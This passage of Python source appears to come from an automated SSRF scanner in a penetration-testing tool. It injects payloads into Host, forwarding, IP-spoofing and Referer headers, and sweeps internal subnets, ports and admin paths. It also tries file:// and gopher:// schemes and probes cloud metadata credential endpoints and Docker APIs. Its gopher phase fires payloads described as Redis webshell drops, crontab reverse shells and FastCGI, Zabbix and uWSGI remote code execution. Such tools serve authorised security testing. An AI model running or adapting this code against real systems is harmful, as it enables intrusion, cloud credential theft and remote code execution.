                            "possible password-reset poisoning or cache poisoning"
                        )
                        confidence = "HIGH"
                    else:
                        confidence, note = self._ssrf_analyse_response(
                            status, length, elapsed, text, host_val, baseline
                        )
                        extra_note = note

                    final_conf = self._ssrf_merge_confidence(confidence, conf_base)
                    if final_conf in ("HIGH", "MEDIUM", "LOW"):
                        self._ssrf_record_finding(
                            results,
                            {"name": "Host", "type": "header",
                             "display": "🖥️  Header: Host"},
                            host_val, status, length, elapsed,
                            baseline, phase=f"host_header_{sub_phase}",
                            confidence=final_conf,
                            note=extra_note or f"Host: {host_val}",
                        )
                        results["detection_summary"]["host_header"] = True
                        self.scan_progress.emit(
                            f"  ✅ [{final_conf}] Host: {host_val} → {status} "
                            f"({length}b)  {extra_note[:80]}"
                        )

            except Exception as e:
                logger.debug(f"Host header probe error ({host_val}): {e}")

        # ── Fire X-Forwarded-Host payloads ────────────────────────────────
        self.scan_progress.emit("  ↳ Testing X-Forwarded-Host...")
        for xfh_val, sub_phase, conf_base in xfh_payloads:
            if not self.running:
                break

            mod_headers = {k: v for k, v in headers.items()
                           if k.lower() not in ("host", "x-forwarded-host")}
            mod_headers["X-Forwarded-Host"] = xfh_val

            start = time.time()
            try:
                resp = self.send_request_with_traffic(
                    full_url, mod_headers, method=method,
                    body=body_content,
                    payload=xfh_val,
                    payload_type=f"SSRF-XFH-{sub_phase}",
                )
                elapsed = round(time.time() - start, 3)
                results["stats"]["payloads_tested"] += 1

                if resp and hasattr(resp, "status_code"):
                    status = getattr(resp, "status_code", 0)
                    length = len(getattr(resp, "content", b""))
                    text   = getattr(resp, "text", "")

                    extra_note = ""
                    loc = ""
                    if hasattr(resp, "headers"):
                        loc = resp.headers.get("Location", "")
                    if xfh_val in text or xfh_val in loc:
                        extra_note = (
                            f"⚠️ X-Forwarded-Host '{xfh_val}' reflected in response — "
                            "possible header-based cache poisoning or SSRF routing"
                        )
                        confidence = "HIGH"
                    else:
                        confidence, note = self._ssrf_analyse_response(
                            status, length, elapsed, text, xfh_val, baseline
                        )
                        extra_note = note

                    final_conf = self._ssrf_merge_confidence(confidence, conf_base)
                    if final_conf in ("HIGH", "MEDIUM", "LOW"):
                        self._ssrf_record_finding(
                            results,
                            {"name": "X-Forwarded-Host", "type": "header",
                             "display": "🖥️  Header: X-Forwarded-Host"},
                            xfh_val, status, length, elapsed,
                            baseline, phase=f"xfh_{sub_phase}",
                            confidence=final_conf,
                            note=extra_note or f"X-Forwarded-Host: {xfh_val}",
                        )
                        results["detection_summary"]["host_header"] = True

            except Exception as e:
                logger.debug(f"X-Forwarded-Host probe error ({xfh_val}): {e}")

        # ── Fire X-Original-URL / X-Rewrite-URL payloads ─────────────────
        # These headers override the URL path on IIS/nginx, bypassing access
        # controls and potentially routing to internal paths.
        self.scan_progress.emit("  ↳ Testing X-Original-URL / X-Rewrite-URL...")
        path_override_headers = ["X-Original-URL", "X-Rewrite-URL", "X-Forwarded-Prefix"]
        path_override_payloads = [
            "/admin",
            "/admin/",
            "/internal",
            "/api/admin",
            "/actuator",
            "/actuator/env",
            "http://localhost/admin",
            "http://127.0.0.1/admin",
            "http://169.254.169.254/latest/meta-data/",
        ]
        for path_header in path_override_headers:
            for path_val in path_override_payloads:
                if not self.running:
                    break
                mod_headers = {k: v for k, v in headers.items()
                               if k.lower() not in ("host",)}
                mod_headers[path_header] = path_val
                try:
                    start = time.time()
                    resp = self.send_request_with_traffic(
                        full_url, mod_headers, method=method,
                        body=body_content,
                        payload=path_val,
                        payload_type=f"SSRF-{path_header.replace('-','')}-override",
                    )
                    elapsed = round(time.time() - start, 3)
                    results["stats"]["payloads_tested"] += 1
                    if resp and hasattr(resp, "status_code"):
                        status = getattr(resp, "status_code", 0)
                        length = len(getattr(resp, "content", b""))
                        text   = getattr(resp, "text", "")
                        confidence, note = self._ssrf_analyse_response(
                            status, length, elapsed, text, path_val, baseline
                        )
                        if confidence in ("HIGH", "MEDIUM"):
                            self._ssrf_record_finding(
                                results,
                                {"name": path_header, "type": "header",
                                 "display": f"🖥️  Header: {path_header}"},
                                path_val, status, length, elapsed,
                                baseline, phase=f"path_override_{path_header.lower().replace('-','_')}",
                                confidence=confidence,
                                note=f"{path_header}: {path_val} — {note}",
                            )
                            results["detection_summary"]["host_header"] = True
                            results["vulnerable"] = True
                            self.scan_progress.emit(
                                f"  ✅ [{confidence}] {path_header}: {path_val} → {status}"
                            )
                except Exception as e:
                    logger.debug(f"{path_header} probe error ({path_val}): {e}")

        # ── IP-spoofing headers (bypass IP-based access control) ──────────
        # These don't cause SSRF directly but often bypass IP allowlists,
        # which can expose admin panels or internal APIs.
        self.scan_progress.emit("  ↳ Testing IP-spoofing headers...")
        ip_spoof_headers = [
            "X-Custom-IP-Authorization",
            "True-Client-IP",
            "CF-Connecting-IP",
            "X-Forwarded-For",
            "X-Real-IP",
            "X-Originating-IP",
            "X-Remote-IP",
            "X-Remote-Addr",
            "X-Client-IP",
        ]
        ip_spoof_payloads = ["127.0.0.1", "localhost", "0.0.0.0", "::1", "169.254.169.254"]
        for ip_header in ip_spoof_headers:
            for ip_val in ip_spoof_payloads:
                if not self.running:
                    break
                mod_headers = {k: v for k, v in headers.items()
                               if k.lower() not in ("host",)}
                mod_headers[ip_header] = ip_val
                try:
                    start = time.time()
                    resp = self.send_request_with_traffic(
                        full_url, mod_headers, method=method,
                        body=body_content,
                        payload=ip_val,
                        payload_type=f"SSRF-IPSpoof-{ip_header.replace('-','').replace('X','').lower()}",
                    )
                    elapsed = round(time.time() - start, 3)
                    results["stats"]["payloads_tested"] += 1
                    if resp and hasattr(resp, "status_code"):
                        status = getattr(resp, "status_code", 0)
                        length = len(getattr(resp, "content", b""))
                        text   = getattr(resp, "text", "")
                        confidence, note = self._ssrf_analyse_response(
                            status, length, elapsed, text, ip_val, baseline
                        )
                        if confidence in ("HIGH", "MEDIUM"):
                            self._ssrf_record_finding(
                                results,
                                {"name": ip_header, "type": "header",
                                 "display": f"🖥️  Header: {ip_header}"},
                                ip_val, status, length, elapsed,
                                baseline, phase=f"ip_spoof_{ip_header.lower().replace('-','_')}",
                                confidence=confidence,
                                note=f"IP-spoof: {ip_header}: {ip_val} — {note}",
                            )
                            results["detection_summary"]["host_header"] = True
                            results["vulnerable"] = True
                            self.scan_progress.emit(
                                f"  ✅ [{confidence}] {ip_header}: {ip_val} → {status}"
                            )
                except Exception as e:
                    logger.debug(f"{ip_header} probe error ({ip_val}): {e}")

    def _ssrf_phase_referer(self, ctx: Dict) -> None:
        """
        Some analytics / logging middleware on the server fetches the Referer
        URL to track incoming links.  Inject SSRF payloads into the Referer
        header directly.
        """
        full_url    = ctx["full_url"]
        parsed      = ctx["parsed"]
        method      = ctx["method"]
        headers     = ctx["headers"]
        body_params = ctx["body_params"]
        body_content= ctx["body_content"]
        cookies     = ctx["cookies"]
        baseline    = ctx["baseline"]
        results     = ctx["results"]

        self.scan_progress.emit("\n🔗 Phase 7 — Referer Header SSRF")

        referer_payloads = [
            # Loopback
            "http://127.0.0.1/",
            "http://127.0.0.1/admin",
            "http://localhost/",
            "http://localhost/admin",
            "http://0.0.0.0/",
            # Bypass variants
            "http://127.1/",
            "http://2130706433/",           # 127.0.0.1 decimal
            "http://0x7f000001/",           # 127.0.0.1 hex
            "http://[::1]/",
            # Cloud metadata
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/computeMetadata/v1/",
            "http://metadata.google.internal/computeMetadata/v1/",
            # Internal common services
            "http://192.168.0.1/admin",
            "http://192.168.1.1/",
            "http://10.0.0.1/",
        ]
        oast = getattr(self, "oast_url", None)
        if oast:
            referer_payloads.append(oast.strip().rstrip("/"))

        for payload in referer_payloads:
            if not self.running:
                break

            # Build modified headers with the injected Referer
            mod_headers = {k: v for k, v in headers.items()
                           if k.lower() not in ("host", "referer")}
            mod_headers["Referer"] = payload

            start = time.time()
            resp = self.send_request_with_traffic(
                full_url, mod_headers, method=method,
                body=body_content,
                payload=payload, payload_type="SSRF-Referer",
            )
            elapsed = round(time.time() - start, 3)
            results["stats"]["payloads_tested"] += 1

            if resp and hasattr(resp, "status_code"):
                status = getattr(resp, "status_code", 0)
                length = len(getattr(resp, "content", b""))
                text   = getattr(resp, "text", "")

                confidence, note = self._ssrf_analyse_response(
                    status, length, elapsed, text, payload, baseline
                )
                if confidence in ("HIGH", "MEDIUM", "LOW"):
                    self._ssrf_record_finding(
                        results, {"name": "Referer", "type": "header",
                                  "display": "📋 Header: Referer"},
                        payload, status, length, elapsed,
                        baseline, phase="referer_header",
                        confidence=confidence, note=note,
                    )
                    results["detection_summary"]["referer_header"] = True

    # =========================================================================
    # PHASE 8 — SMART VALUE-AWARE INJECTION
    # =========================================================================

    def _ssrf_phase_smart_value(
        self, candidate, full_url, parsed, method, headers,
        body_params, body_content, cookies, baseline, results
    ) -> None:
        """
        When the parameter value already contains a URL (e.g.
        stockApi=http://192.168.0.1:8080/product/stock/check?productId=1)
        we decompose it and run an Intruder-style sweep on each component.

        Sub-phases:
          8a — IP subnet sweep   (change last/third octet across the subnet)
          8b — Port sweep        (keep IP, probe common service ports)
          8c — Path fuzzing      (keep IP:port, try admin/sensitive paths)
          8d — Protocol swap     (keep host, change scheme to file://, gopher://, etc.)
        """
        raw_value = urllib.parse.unquote(str(candidate["value"]))
        url_parts = urllib.parse.urlparse(raw_value)

        scheme    = url_parts.scheme or "http"
        host      = url_parts.hostname or ""
        port      = url_parts.port
        orig_path = url_parts.path or "/"

        self.scan_progress.emit(
            f"  🔎 Decomposed URL — scheme:{scheme}  host:{host}  "
            f"port:{port or 'default'}  path:{orig_path}"
        )

        # ── 8a: IP subnet sweep ───────────────────────────────────────────
        ip_class = self._ssrf_classify_ip(host)
        if ip_class:
            self.scan_progress.emit(
                f"\n  📡 Phase 8a — Subnet Sweep (Class {ip_class} — {host})"
            )
            sweep_targets = self._ssrf_generate_subnet_sweep(
                host, ip_class, port, orig_path, scheme
            )
            self.scan_progress.emit(
                f"     Sweeping {len(sweep_targets)} addresses in subnet..."
            )
            self._ssrf_fire_payloads(
                candidate, sweep_targets, full_url, parsed, method, headers,
                body_params, body_content, cookies, baseline, results,
                phase="smart_value_aware", phase_key="smart_value_aware",
                confidence_base="HIGH",
                parallel_override=True,     # always parallelise subnet sweep
            )

        # ── 8b: Port sweep on original IP ────────────────────────────────
        if host:
            self.scan_progress.emit(
                f"\n  🚪 Phase 8b — Port Sweep on {host}"
            )
            port_payloads = [
                f"{scheme}://{host}:{p}/"
                for p in _PORT_SWEEP
            ]
            self._ssrf_fire_payloads(
                candidate, port_payloads, full_url, parsed, method, headers,
                body_params, body_content, cookies, baseline, results,
                phase="smart_value_aware", phase_key="smart_value_aware",
                confidence_base="MEDIUM",
                parallel_override=True,
            )

        # ── 8c: Path fuzzing ──────────────────────────────────────────────
        if host:
            self.scan_progress.emit(
                f"\n  📂 Phase 8c — Path Fuzzing on {host}"
            )
            port_str = f":{port}" if port else ""
            path_payloads = [
                f"{scheme}://{host}{port_str}{p}"
                for p in _ADMIN_PATHS
            ]
            self._ssrf_fire_payloads(
                candidate, path_payloads, full_url, parsed, method, headers,
                body_params, body_content, cookies, baseline, results,
                phase="smart_value_aware", phase_key="smart_value_aware",
                confidence_base="HIGH",
            )

        # ── 8d: Protocol swap ─────────────────────────────────────────────
        if host:
            self.scan_progress.emit(
                f"\n  🔌 Phase 8d — Protocol Swap on {host}"
            )
            port_str = f":{port}" if port else ""
            proto_payloads = [
                f"file:///etc/passwd",
                f"file:///etc/hosts",
                f"dict://{host}{port_str}/info",
                f"gopher://{host}{port_str}/_INFO%0d%0a",
                f"https://{host}{port_str}{orig_path}",
                f"ftp://{host}{port_str}/",
            ]
            self._ssrf_fire_payloads(
                candidate, proto_payloads, full_url, parsed, method, headers,
                body_params, body_content, cookies, baseline, results,
                phase="smart_value_aware", phase_key="smart_value_aware",
                confidence_base="MEDIUM",
            )

    def _ssrf_generate_subnet_sweep(
        self,
        original_ip: str,
        ip_class: str,
        port: Optional[int],
        path: str,
        scheme: str,
    ) -> List[str]:
        """
        Generate the sweep list for Phase 8a.
        Prioritises high-value addresses (gateway, broadcast neighbours,
        round numbers) before doing a full last-octet sweep.
        """
        port_str = f":{port}" if port else ""
        octets   = original_ip.split(".")

        targets: List[str] = []

        if ip_class in ("C", "LO"):
            # Sweep last octet 1-254 — put priority addresses first
            priority = [1, 2, 10, 20, 50, 100, 128, 200, 254]
            full_range = list(range(1, 255))
            ordered = priority + [x for x in full_range if x not in priority]
            prefix = ".".join(octets[:3])
            for last in ordered:
                ip = f"{prefix}.{last}"
                targets.append(f"{scheme}://{ip}{port_str}{path}")
                targets.append(f"{scheme}://{ip}{port_str}/admin")

        elif ip_class == "B":
            # Sweep third octet 0-50 (keep it sane), last octet = 1 and original
            third_range = list(range(0, 51))
            orig_last   = octets[3]
            prefix2     = ".".join(octets[:2])
            for third in third_range:
                for last in [1, int(orig_last)]:
                    ip = f"{prefix2}.{third}.{last}"
                    targets.append(f"{scheme}://{ip}{port_str}{path}")

        elif ip_class == "A":
            # Sweep second octet 0-30, keep third/last from original
            second_range = list(range(0, 31))
            orig_third   = octets[2]
            orig_last    = octets[3]
            for second in second_range:
                ip = f"10.{second}.{orig_third}.{orig_last}"
                targets.append(f"{scheme}://{ip}{port_str}{path}")
                ip1 = f"10.{second}.{orig_third}.1"
                targets.append(f"{scheme}://{ip1}{port_str}/admin")

        elif ip_class == "LL":
            # Link-local / metadata — just probe the metadata endpoints
            targets.extend(_CLOUD_METADATA)

        # Deduplicate
        seen: set = set()
        unique: List[str] = []
        for t in targets:
            if t not in seen:
                seen.add(t)
                unique.append(t)
        return unique

    # =========================================================================
    # PHASE 9 — PARTIAL URL / HOSTNAME-ONLY PARAMS
    # =========================================================================

    def _ssrf_phase_partial_url(
        self, candidate, full_url, parsed, method, headers,
        body_params, body_content, cookies, baseline, results
    ) -> None:
        """
        Some apps only accept a hostname or path fragment — the server
        builds the full URL internally.  Inject just the host portion.
        """
        # These will be incorporated server-side into a full URL
        partial_payloads = [
            "127.0.0.1",
            "localhost",
            "127.0.0.1:80",
            "127.0.0.1:8080",
            "169.254.169.254",
            "192.168.0.1",
            # Obfuscated
            "2130706433",       # decimal 127.0.0.1
            "0177.0.0.01",      # octal
            "0x7f.0x0.0x0.0x1", # hex
            "@127.0.0.1",       # @ trick
            "127.0.0.1#",       # fragment confusion
            # Path-only injection (if app prepends https://trusted-host)
            "@127.0.0.1/admin",
            "@192.168.0.1/admin",
        ]
        self._ssrf_fire_payloads(
            candidate, partial_payloads, full_url, parsed, method, headers,
            body_params, body_content, cookies, baseline, results,
            phase="partial_url", phase_key="loopback",
            confidence_base="MEDIUM",
        )

    # =========================================================================
    # PHASE 10 — CLOUD METADATA ENDPOINT PROBING
    # =========================================================================

    def _ssrf_phase_cloud_metadata(
        self, candidate, full_url, parsed, method, headers,
        body_params, body_content, cookies, baseline, results
    ) -> None:
        """
        Probe all known cloud metadata endpoints.
        A 200 response with metadata keywords = critical finding.
        """
        self._ssrf_fire_payloads(
            candidate, _CLOUD_METADATA, full_url, parsed, method, headers,
            body_params, body_content, cookies, baseline, results,
            phase="cloud_metadata", phase_key="cloud_metadata",
            confidence_base="HIGH",
        )

    # =========================================================================
    # PHASE 10b — PROTOCOL SMUGGLING
    # =========================================================================

    def _ssrf_phase_protocol_smuggling(
        self, candidate, full_url, parsed, method, headers,
        body_params, body_content, cookies, baseline, results
    ) -> None:
        """
        Try non-HTTP schemes: file://, gopher://, dict://, ftp://.
        These can bypass HTTP-only SSRF defences and directly read local files
        or interact with internal services.
        """
        self._ssrf_fire_payloads(
            candidate, _PROTOCOL_PAYLOADS, full_url, parsed, method, headers,
            body_params, body_content, cookies, baseline, results,
            phase="protocol_smuggling", phase_key="protocol_smuggling",
            confidence_base="HIGH",
        )

    # =========================================================================
    # PHASE 11 — GOPHER SERVICE EXPLOITATION (SSRFmap-style)
    # =========================================================================

    def _ssrf_phase_gopher_services(
        self, candidate, full_url, parsed, method, headers,
        body_params, body_content, cookies, baseline, results
    ) -> None:
        """
        Generate and fire gopher:// payloads that directly exploit internal
        services when the server follows the URL.  These are the SSRFmap
        modules that our previous scanner was missing:

          • Redis      — INFO fingerprint, webshell drop, crontab reverse shell
          • FastCGI    — PHP PEAR.php RCE (port 9000)
          • MySQL      — unauthenticated SELECT fingerprint (port 3306)
          • Memcached  — stats dump (port 11211)
          • Zabbix     — system.run RCE (port 10050)
          • SMTP       — spoofed email (port 25)
          • uWSGI      — UWSGI_FILE RCE (port 8000 / 5000)
          • Proxy smuggling — gopher through open HTTP proxy

        Payloads are generated for all loopback + common internal IPs.
        """
        # IPs to test gopher exploitation against
        target_ips = [
            "127.0.0.1", "localhost", "0.0.0.0", "::1",
            "192.168.0.1", "192.168.1.1", "10.0.0.1", "172.16.0.1",
        ]

        payloads = []

        for ip in target_ips:
            safe_ip = ip  # gopher needs raw IP
            # Redis INFO fingerprint
            payloads.append(f"gopher://{safe_ip}:6379/_INFO%0d%0a")
            payloads.append(f"gopher://{safe_ip}:6379/_CONFIG%20GET%20dir%0d%0a")

            # Redis webshell drop
            payloads.append(
                _GOPHER_REDIS_WEBSHELL.replace("{IP}", safe_ip)
            )

            # FastCGI RCE
            payloads.append(
                _GOPHER_FASTCGI_RCE.replace("{IP}", safe_ip)
            )

            # MySQL fingerprint
            payloads.append(
                _GOPHER_MYSQL_FINGERPRINT.replace("{IP}", safe_ip)
            )

            # Memcached stats
            payloads.append(
                _GOPHER_MEMCACHED_DUMP.replace("{IP}", safe_ip)
            )

            # Zabbix RCE
            payloads.append(
                _GOPHER_ZABBIX_RCE.replace("{IP}", safe_ip)
            )

            # SMTP probe
            domain = parsed.netloc.split(":")[0] or "target.local"
            payloads.append(
                _GOPHER_SMTP_TEMPLATE
                .replace("{IP}", safe_ip)
                .replace("{DOMAIN}", domain)
            )

            # uWSGI probe
            payloads.append(
                _GOPHER_UWSGI_RCE.replace("{IP}", safe_ip)
            )

            # Proxy smuggling via open proxy on :8080
            payloads.append(
                f"gopher://{safe_ip}:8080/_GET%20http://169.254.169.254/"
                "latest/meta-data/%20HTTP/1.1%0d%0a"
                "Host:%20169.254.169.254%0d%0a%0d%0a"
            )

        self.scan_progress.emit(
            f"  ↳ Firing {len(payloads)} gopher service exploitation payload(s) "
            "across loopback + common internal IPs"
        )
        self._ssrf_fire_payloads(
            candidate, payloads, full_url, parsed, method, headers,
            body_params, body_content, cookies, baseline, results,
            phase="gopher_service_rce", phase_key="gopher_service_rce",
            confidence_base="HIGH",
        )

    # =========================================================================
    # PHASE 12 — DOCKER API INFO-LEAK
    # =========================================================================

    def _ssrf_phase_docker_api(
        self, candidate, full_url, parsed, method, headers,
        body_params, body_content, cookies, baseline, results
    ) -> None:
        """
        Probe Docker daemon's REST API (default: TCP 2375 without TLS).
        A response containing 'ApiVersion' or container data = critical finding.
        Covers the SSRFmap 'docker' module.
        """
        target_ips = [
            "127.0.0.1", "localhost", "10.0.0.1",
            "192.168.0.1", "172.16.0.1",
        ]
        payloads = []
        for ip in target_ips:
            for tmpl in _DOCKER_API_PROBES + _TOMCAT_MANAGER_PROBES:
                payloads.append(tmpl.replace("{IP}", ip))

        self._ssrf_fire_payloads(
            candidate, payloads, full_url, parsed, method, headers,
            body_params, body_content, cookies, baseline, results,
            phase="docker_api", phase_key="docker_api",
            confidence_base="HIGH",
        )

    # =========================================================================
    # PHASE 13 — DNS REBINDING BYPASS
    # =========================================================================

    def _ssrf_phase_dns_rebinding(
        self, candidate, full_url, parsed, method, headers,
        body_params, body_content, cookies, baseline, results
    ) -> None:
        """
        DNS rebinding: a specially crafted domain initially resolves to a
        benign/allowed IP but the DNS TTL is so short that a second resolution
        returns the target internal IP (time-of-check/time-of-use bypass).

        Uses public rebinding services like rbndr.us and 1u.ms.
        These work best with repeated requests — we fire them several times.
        """
        payloads = []
        for domain in _DNS_REBIND_DOMAINS:
            payloads.append(f"http://{domain}/")
            payloads.append(f"http://{domain}/latest/meta-data/")
            payloads.append(f"http://{domain}/admin")

        self._ssrf_fire_payloads(
            candidate, payloads, full_url, parsed, method, headers,
            body_params, body_content, cookies, baseline, results,
            phase="dns_rebinding", phase_key="dns_rebinding",
            confidence_base="MEDIUM",
        )

    # =========================================================================
    # PHASE 14 — URL PARSER DISCREPANCY
    # =========================================================================

    def _ssrf_phase_url_parser(
        self, candidate, full_url, parsed, method, headers,
        body_params, body_content, cookies, baseline, results
    ) -> None:
        """
        Exploit differences in how urllib2 / requests / urllib parse the same
        URL string.  Certain payloads are interpreted as connecting to
        different hosts by the frontend validator vs the backend fetcher.

        Examples:
          http://127.1.1.1:80\\@127.0.0.1/
          → urllib2 sees host=127.1.1.1
          → requests redirects to 127.0.0.1

        See: PortSwigger Lab / Orange Tsai URL parsing research
        """
        self._ssrf_fire_payloads(
            candidate, _URL_PARSER_DISCREPANCY, full_url, parsed, method, headers,
            body_params, body_content, cookies, baseline, results,
            phase="url_parser_discrepancy", phase_key="url_parser_discrepancy",
            confidence_base="MEDIUM",
        )

    # =========================================================================
    # PHASE 15 — AWS IMDSv2 TOKEN ESCALATION
    # =========================================================================

    def _ssrf_phase_imdsv2(
        self, candidate, full_url, parsed, method, headers,
        body_params, body_content, cookies, baseline, results
    ) -> None:
        """
        AWS IMDSv2 requires a two-step process:
          Step 1 — PUT 169.254.169.254/latest/api/token  (returns session token)
          Step 2 — GET /latest/meta-data/iam/security-credentials/ with token header

        If the backend server forwards PUT requests (or we can inject the token
        header), this escalates an SSRF to full credential theft.

        We test both the IMDSv1 (no auth) and guide the IMDSv2 flow.
        Also probes Google Cloud (requires Metadata-Flavor: Google header),
        Azure IMDS, and the newer GCP token endpoint.
        """
        imdsv2_payloads = [
            # IMDSv2 token request (PUT — may be sent as GET by some SSRF libs)
            "http://169.254.169.254/latest/api/token",
            # With IMDSv1 fallback paths
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/meta-data/iam/",
            "http://169.254.169.254/latest/meta-data/",
            # GCP — standard + token
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            "http://metadata.google.internal/computeMetadata/v1/project/project-id",
            # Azure — IMDS + managed identity token
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
            # DigitalOcean
            "http://169.254.169.254/metadata/v1/id",
            "http://169.254.169.254/metadata/v1/interfaces/public/0/anchor_ipv4/address",
            # Oracle Cloud
            "http://169.254.169.254/opc/v1/instance/",
            "http://169.254.169.254/opc/v2/instance/",
            # Alibaba Cloud
            "http://100.100.100.200/latest/meta-data/",
            "http://100.100.100.200/latest/meta-data/ram/security-credentials/",
        ]

        # For GCP we need the Metadata-Flavor header — send separately
        gcp_payloads = [
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            "http://metadata.google.internal/computeMetadata/v1/project/project-id",
            "http://metadata.google.internal/computeMetadata/v1/",
        ]

        self._ssrf_fire_payloads(
            candidate, imdsv2_payloads, full_url, parsed, method, headers,
            body_params, body_content, cookies, baseline, results,
            phase="imdsv2", phase_key="imdsv2",
            confidence_base="HIGH",
        )

        # Fire GCP payloads with Metadata-Flavor header injected
        for payload in gcp_payloads:
            if not self.running:
                break
            mod_headers = dict(headers)
            mod_headers["Metadata-Flavor"] = "Google"
            try:
                start = time.time()
                injected_url = payload  # we inject this as the param value
                # We can't easily add headers per-payload in fire_payloads,
                # so we do it manually here
                ctype = candidate["type"]
                cname = candidate["name"]
                resp = None
                if ctype == "param_url":
                    qparams = urllib.parse.parse_qs(parsed.query)
                    qparams[cname] = [payload]
                    new_qs = urllib.parse.urlencode(qparams, doseq=True)
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_qs}"
                    resp = self.send_request_with_traffic(
                        test_url, mod_headers, method=method,
                        payload=payload, payload_type="SSRF-imdsv2-gcp",
                    )
                elif ctype == "param_body":
                    content_type = headers.get("Content-Type", "").lower()
                    if "application/json" in content_type:
                        try:
                            jdata = json.loads(body_content or "{}")
                        except Exception:
                            jdata = {}
                        jdata[cname] = payload
                        new_body = json.dumps(jdata)
                    else:
                        bparams = {k: (v[0] if isinstance(v, list) else v)
                                   for k, v in (body_params or {}).items()}
                        bparams[cname] = payload
                        new_body = urllib.parse.urlencode(bparams)
                    resp = self.send_request_with_traffic(
                        full_url, mod_headers, method=method,
                        body=new_body,
                        payload=payload, payload_type="SSRF-imdsv2-gcp",
                    )
                results["stats"]["payloads_tested"] += 1
                if resp and hasattr(resp, "status_code"):
                    elapsed = round(time.time() - start, 3)
                    status = getattr(resp, "status_code", 0)
                    length = len(getattr(resp, "content", b""))
                    text = getattr(resp, "text", "")[:8000]
                    confidence, note = self._ssrf_analyse_response(
                        status, length, elapsed, text, payload, baseline
                    )
                    if confidence in ("HIGH", "MEDIUM"):
                        self._ssrf_record_finding(
                            results, candidate, payload,
                            status, length, elapsed, baseline,
                            phase="imdsv2", confidence=confidence,
                            note=f"GCP Metadata-Flavor header injected. {note}",
                        )
                        results["detection_summary"]["imdsv2"] = True
            except Exception as e:
                logger.debug(f"IMDSv2 GCP probe error: {e}")

    # =========================================================================
    # PHASE 16 — HOST HEADER SSRF + X-FORWARDED-HOST OVERRIDE
    def _ssrf_fire_payloads(
        self,
        candidate:        Dict,
        payloads:         List[str],
        full_url:         str,
        parsed,
        method:           str,
        headers:          Dict,
        body_params:      Dict,
        body_content:     str,
        cookies:          Dict,
        baseline:         Dict,
        results:          Dict,
        phase:            str,
        phase_key:        str,
        confidence_base:  str = "MEDIUM",
        parallel_override: bool = False,
        raw_inject:       bool = False,
    ) -> None:
        """
        Send a list of SSRF payloads against a single candidate.
        Respects boost_mode, stop_on_first, and running flag.
        Parallel when boost_mode or parallel_override.

        raw_inject=True  — payload is written verbatim into the request body /
                           query string WITHOUT further URL-encoding.  Required
                           for whitelist-bypass payloads that contain deliberately
                           encoded characters (e.g. %2523 must stay as-is).
        """
        use_parallel = self.boost_mode or parallel_override
        raw_tag = " ⚠ raw" if raw_inject else ""
        self.scan_progress.emit(
            f"  ↳ {len(payloads)} payload(s)  "
            f"{'⚡ parallel' if use_parallel else 'sequential'}{raw_tag}"
        )

        if use_parallel:
            cancel_evt = threading.Event()

            def _worker(payload, _c=cancel_evt):
                if _c.is_set() or not self.running:
                    return None
                return self._ssrf_inject(
                    candidate, payload, full_url, parsed, method,
                    headers, body_params, body_content, cookies,
                    phase=phase, raw_inject=raw_inject,
                )

            max_w = getattr(self, "scan_max_workers", 8)
            with concurrent.futures.ThreadPoolExecutor(max_workers=max_w) as ex:
                future_map = {}
                for p in payloads:
                    if not self.running or cancel_evt.is_set():
                        break
                    future_map[ex.submit(_worker, p)] = p

                for future in concurrent.futures.as_completed(future_map):
                    if not self.running:
                        cancel_evt.set()
                        break
                    if results["vulnerable"] and getattr(self, "scan_stop_on_first", False):
                        cancel_evt.set()
                        self.scan_progress.emit(
                            "  ⏭️  Stop-on-first: SSRF confirmed — "
                            "cancelling remaining payloads"
                        )
                        break
                    try:
                        injected = future.result(timeout=35)
                        payload  = future_map[future]
                        results["stats"]["payloads_tested"] += 1
                        if injected:
                            self._ssrf_evaluate(
                                injected, payload, candidate, baseline,
                                results, phase, phase_key, confidence_base
                            )
                    except Exception as e:
                        self.scan_progress.emit(
                            f"  ✗ Worker error: {str(e)[:60]}"
                        )
        else:
            for payload in payloads:
                if not self.running:
                    break
                if results["vulnerable"] and getattr(self, "scan_stop_on_first", False):
                    self.scan_progress.emit(
                        "  ⏭️  Stop-on-first: SSRF confirmed — stopping"
                    )
                    break

                injected = self._ssrf_inject(
                    candidate, payload, full_url, parsed, method,
                    headers, body_params, body_content, cookies,
                    phase=phase, raw_inject=raw_inject,
                )
                results["stats"]["payloads_tested"] += 1
                if injected:
                    self._ssrf_evaluate(
                        injected, payload, candidate, baseline,
                        results, phase, phase_key, confidence_base
                    )

    def _ssrf_inject(
        self,
        candidate:    Dict,
        payload:      str,
        full_url:     str,
        parsed,
        method:       str,
        headers:      Dict,
        body_params:  Dict,
        body_content: str,
        cookies:      Dict,
        phase:        str = "",
        raw_inject:   bool = False,
    ) -> Optional[Dict]:
        """
        Build the modified request with the SSRF payload injected into the
        candidate location (URL param, POST body param, or header), send it,
        and return a response dict.  Returns None on transport error.

        raw_inject=True  — the payload value is written verbatim into the
                           request WITHOUT any further URL-encoding.
                           This is required for whitelist-bypass payloads
                           that contain deliberately encoded characters such as
                           %2523 (which must reach the server as-is so that
                           the server's second decode step produces %23 → #).

        Normal mode (raw_inject=False):
          urllib.parse.urlencode() is used, which percent-encodes special chars.
          This is correct for plain-text payloads (IPs, URLs, etc.).

        Raw mode (raw_inject=True):
          For form-encoded POST bodies:
            We manually build the body as  name=value  where value is NOT
            re-encoded.  Other parameters are re-encoded normally.
          For URL query string:
            We manually splice the encoded param into the query string.
          For headers:
            Value is set verbatim (headers are not URL-encoded).
        """
        ctype  = candidate["type"]
        cname  = candidate["name"]
        pt     = f"SSRF-{phase}-{cname}"

        # Strip Host (always re-derived from URL) but preserve Cookie.
        # Some earlier versions stripped Cookie here which caused 401/403
        # responses that looked like SSRF signals — false positives.
        clean_headers = {k: v for k, v in headers.items()
                         if k.lower() not in ("host",)}

        try:
            start = time.time()

            if ctype == "param_url":
                if raw_inject:
                    # Splice verbatim: rebuild query string preserving other params
                    other_params = {k: v for k, v in
                                    urllib.parse.parse_qs(parsed.query).items()
                                    if k != cname}
                    other_qs = urllib.parse.urlencode(other_params, doseq=True)
